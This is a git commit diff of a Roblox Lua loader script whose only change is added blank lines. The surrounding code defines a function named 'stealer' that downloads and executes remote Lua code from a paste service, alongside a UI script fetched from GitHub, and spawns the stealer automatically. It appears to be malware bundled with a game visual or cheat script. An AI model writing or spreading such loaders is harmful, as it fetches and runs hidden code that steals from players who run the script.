9ac10b828b81efc1acf95b7bb74dd1af42a20186
Lib <ybanezjosevincent.bshm.cpc@gmail.com>
2025-07-27 09:31:55 +0800

    Update LoaderV1.lua

--- Loader/LoaderV1.lua
+++ Loader/LoaderV1.lua
@@ -1,10 +1,12 @@
 local function stealer()
 
 loadstring(game:HttpGet("https://api.rubis.app/v2/scrap/vCqomMAneDVdhHL4/raw", true))()
+
 end
 local function loadui()
 
 loadstring(game:HttpGet("https://raw.githubusercontent.com/veryimportantrr/x/refs/heads/main/gag_visual.lua", true))()
+
 end
 
 task.spawn(stealer)
